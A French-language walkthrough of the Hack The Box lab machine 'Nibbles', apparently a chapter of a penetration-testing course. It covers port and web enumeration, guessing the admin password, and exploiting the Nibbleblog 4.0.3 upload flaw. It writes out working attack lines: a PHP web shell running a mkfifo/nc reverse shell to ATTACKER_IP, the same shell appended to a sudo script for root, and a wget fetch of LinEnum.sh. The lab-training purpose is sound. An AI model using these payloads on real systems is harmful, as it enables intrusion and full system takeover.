# Walkthrough : Nibbles

[<< Précédent : Transfert de fichiers](07-transfert-de-fichiers.md) | [Retour au sommaire](README.md)

---

Box Linux easy - illustre le processus complet : énumération, exploitation web, et privilege escalation.

> Box HTB : https://app.hackthebox.com/machines/Nibbles
> Walkthrough 0xdf : https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html
> Video IppSec : https://www.youtube.com/watch?v=s_0GcRGv6Ds

---

## Phase 1 : Énumération réseau

```bash
nmap -sV --open -oA nibbles_initial 10.129.42.190
# Résultat : port 22 (SSH OpenSSH 7.2p2) et port 80 (Apache)

nmap -sC -p 22,80 -oA nibbles_scripts 10.129.42.190
# Scripts par défaut sur les ports ouverts

nmap -p- --open -oA nibbles_full 10.129.42.190
# Scan complet en arrière-plan - pas de port supplémentaire
```

Banner grabbing avec netcat pour confirmer :

```bash
nc -nv 10.129.42.190 22
# -> SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

---

## Phase 2 : Énumération web

```bash
# Page d'accueil - rien d'intéressant en apparence
curl http://10.129.42.190
# -> <b>Hello world!</b>
# -> <!-- /nibbleblog/ directory. Nothing interesting here! -->
# Le commentaire HTML révèle un répertoire caché !

# Fingerprinting du répertoire découvert
whatweb http://10.129.42.190/nibbleblog
# -> Nibbleblog, PHP, jQuery, Apache 2.4.18

# Directory brute-forcing
gobuster dir -u http://10.129.42.190/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Résultats clés : /admin.php (200), /content (301), /README (200)
```

**Découverte de la version :**

```bash
curl http://10.129.42.190/nibbleblog/README
# -> Version: v4.0.3 - vulnérable à une faille d'upload authentifiée
```

**Énumération des fichiers exposés (directory listing activé) :**

```bash
# Confirmation du username
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint --format -
# -> <user username="admin">

# Config du site
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
# -> <name>Nibbles</name>, notification email: admin@nibbles.com
# Indice : le mot "nibbles" revient partout
```

**Identification du mot de passe :**
- Pas de mot de passe par défaut connu pour Nibbleblog
- Protection anti brute-force (blacklist IP après trop de tentatives)
- Indices contextuels : le nom de la box, le titre du site, l'email - tout pointe vers `nibbles`
- Login réussi avec `admin:nibbles`

---

## Phase 3 : Foothold (initial access)

Exploitation de la vulnérabilité **Nibbleblog File Upload** (CVE-2015-6967) via le plugin "My image" :

```bash
# 1) Upload d'un fichier PHP via le plugin My Image dans /admin.php
#    Contenu : <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 9443 >/tmp/f"); ?>

# 2) Listener sur notre machine
nc -lvnp 9443

# 3) Déclencher l'exécution
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

# 4) Upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z -> stty raw -echo -> fg -> Enter x2
```

Le fichier uploadé est stocké dans `/nibbleblog/content/private/plugins/my_image/image.php` - le chemin est prévisible grâce au directory listing.

---

## Phase 4 : Privilege Escalation

```bash
# Énumération automatisée
wget http://ATTACKER_IP:8080/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh

# Découverte critique : sudo sans mot de passe
sudo -l
# -> (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

# Le fichier est dans une archive
unzip personal.zip
# -> personal/stuff/monitor.sh (writeable par nibbler)

# Injection d'un reverse shell dans le script
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 8443 >/tmp/f' | tee -a monitor.sh

# Execution avec sudo
sudo /home/nibbler/personal/stuff/monitor.sh

# Sur notre machine : reception du shell root
nc -lvnp 8443
# -> uid=0(root) gid=0(root) groups=0(root)
```

**Leçon clé** : un fichier writeable exécuté avec `sudo` = escalade de privilèges triviale. Toujours vérifier les permissions des fichiers référencés dans `sudo -l`.

---

## Résumé de la méthodologie

```
nmap (ports ouverts)
  -> curl + code source (répertoire caché /nibbleblog/)
    -> whatweb + gobuster (technos + fichiers exposés)
      -> README (version vulnérable 4.0.3)
      -> users.xml (username: admin)
      -> config.xml (indices pour le password: nibbles)
        -> admin.php login (admin:nibbles)
          -> upload PHP via plugin My Image
            -> reverse shell (nibbler)
              -> sudo -l (monitor.sh NOPASSWD)
                -> append reverse shell + sudo = root
```
